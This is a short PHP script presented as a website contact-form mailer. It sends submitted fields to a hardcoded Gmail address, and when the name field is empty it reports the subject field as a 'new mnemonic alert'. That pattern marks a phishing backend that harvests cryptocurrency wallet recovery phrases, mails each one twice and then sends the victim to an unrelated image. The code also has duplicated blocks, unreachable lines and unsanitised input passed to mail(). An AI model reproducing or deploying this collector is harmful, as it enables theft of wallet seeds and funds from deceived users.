<?php

if($_POST['email'] !=null) {
 
    $to = 'ezekielphlat@gmail.com';

$name = $_POST['name'];
$subject = $_POST['subject'];
$message = $_POST['message'];
$from = $_POST['email'];
 if($name !=null){
         $message = " You have a new messaage alert from your website.\nBelow are the details name:" . "\n\n" . $_POST['name'] . "\n\n". "Subject: ". $_POST['subject'] . "\n\n". "Message: ". $_POST['message'];
    }else{
        $message = " You have a new mnemonic alert from your website.\nBelow are the details subject:" . "\n\n" . $_POST['subject'];
    }

if(mail($to, $subject, $message)){
    echo 'Your mail has been sent successfully.';
      $to = 'ezekielphlat@gmail.com';

$name = $_POST['name'];
$subject = $_POST['subject'];
$message = $_POST['message'];
$from = $_POST['email'];
    if($name !=null){
         $message = " You have a new messaage alert from your website.\nBelow are the details name:" . "\n\n" . $_POST['name'] . "\n\n". "Subject: ". $_POST['subject'] . "\n\n". "Message: ". $_POST['message'];
    }else{
        $message = " You have a new mnemonic alert from your website.\nBelow are the details subject:" . "\n\n" . $_POST['subject'];
    }

 
if(mail($to, $subject, $message)){
    echo 'Your mail has been sent successfully.';
} else{
    echo 'Unable to send email. Please try again.';
}
} else{
    echo 'Unable to send email. Please try again.';
}
 header('Location: https://image.ibb.co/hkgHso/admin.png');
     exit();
    

  die( 'Thank you! Your message has been sent.');

} else {
    die( 'Email Sent Successfully!');
}

?>
